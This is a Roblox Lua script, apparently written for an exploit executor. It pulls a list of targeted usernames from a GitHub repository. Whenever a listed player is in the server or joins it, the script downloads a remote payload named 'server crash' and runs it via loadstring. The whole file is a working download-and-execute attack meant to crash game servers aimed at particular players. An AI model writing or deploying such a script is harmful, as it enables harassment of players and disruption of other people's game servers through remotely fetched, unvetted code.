local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- GitHub URL for the list of usernames
local url = "https://raw.githubusercontent.com/n0raxd/the-sweat-list/refs/heads/main/sweats?token=$(date +%s)"

-- Table to store usernames fetched from the URL
local usernamesToCheck = {}

-- Function to fetch and update the usernames from the GitHub URL
local function updateUsernames()
    local success, result = pcall(function()
        return game:HttpGet(url)
    end)
    
    if success then
        -- Split the result into lines and populate the table
        usernamesToCheck = {}
        for line in result:gmatch("[^\r\n]+") do
            table.insert(usernamesToCheck, line)
        end
        print("Usernames successfully updated.")
    else
        warn("Failed to fetch usernames: " .. tostring(result))
    end
end

-- Function to check if a username is in our list
local function isInList(username)
    for _, name in ipairs(usernamesToCheck) do
        if name:lower() == username:lower() then
            return true
        end
    end
    return false
end

-- Update usernames on script start
updateUsernames()

-- Check existing players
for _, player in ipairs(Players:GetPlayers()) do
    if isInList(player.Name) then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/the-sweat-list/refs/heads/main/server%20crash"))()
    end
end

-- Monitor for new players joining
Players.PlayerAdded:Connect(function(player)
    if isInList(player.Name) then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/the-sweat-list/refs/heads/main/server%20crash"))()
    end
end)
